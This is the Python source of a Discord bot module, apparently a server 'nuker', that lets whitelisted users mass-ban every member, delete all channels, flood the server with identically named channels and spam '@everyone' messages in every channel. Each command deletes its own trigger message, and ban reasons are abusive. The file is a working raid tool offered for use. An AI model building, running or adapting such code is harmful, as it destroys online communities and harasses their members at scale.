import discord
from discord.ext import commands
from rich import print
from config import settings

class Check():
    def in_whitelist(self, ctx):
        if ctx.author in settings["whitelist"]:
            return True
        else:
            print(f"[yellow]{ctx.author} tried to use a command, but haven't permissions to use it! Command: {ctx.message.content}")
            return False

check = Check()
class Commands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.check(check.in_whitelist)
    async def ban(self, ctx, member: discord.Member, reason = "go fuck yourself"):
        "Banning members. Arguments: @member, reason"
        await ctx.message.delete()
        print(f"[green]Banning {member}, reason: {reason}")
        try:
            await member.ban(reason=reason)
        except:
            print(f"[red]Error with banning {member}")

    @commands.command(aliases=['banall']) 
    @commands.check(check.in_whitelist)
    async def ban_all(self, ctx):
        "Banning all members."
        await ctx.message.delete()
        for member in ctx.guild.members:
            if str(member) in settings["whitelist"] or str(member) == settings["bot_user_id"]:
                continue
            else:
                print(f"[green]Banning {member}")
                try:
                    await member.ban(reason="go fuck yourself")
                except:
                    print(f"[yellow]I'm haven't permissions to ban {member}")


    @commands.command(aliases=['del_all', 'delall', 'delch', 'del_ch'])
    @commands.check(check.in_whitelist)
    async def delete_all(self, ctx):
        "Deletes all channels on the server."
        await ctx.message.delete()
        guild = ctx.guild
        for channel in guild.channels:
            if channel == "general":
                continue
            await channel.delete()


    @commands.command(aliases=['spam_channels', 's_chanel', 's_chanell', 's_ch', 'sch'])
    @commands.check(check.in_whitelist)
    async def spam_channel(self, ctx, name, count):
        "Creates a lot of the channels. Args: name_of_the_channels, count"
        await ctx.message.delete()
        for i in range(int(count)):
            guild = self.bot.get_guild(ctx.guild.id)
            await guild.create_text_channel(name)



    @commands.command(aliases=[ 's', 'spammm'])
    @commands.check(check.in_whitelist)
    async def spam(self, ctx, count, *, arg):
        "Spamming in all channels. Args: count, message_text"
        await ctx.message.delete()
        for i in range(int(count)):
            for channel in ctx.guild.text_channels:
                try:
                    await channel.send('@everyone ' + arg)
                except:
                    continue

def setup(bot):
    bot.add_cog(Commands(bot))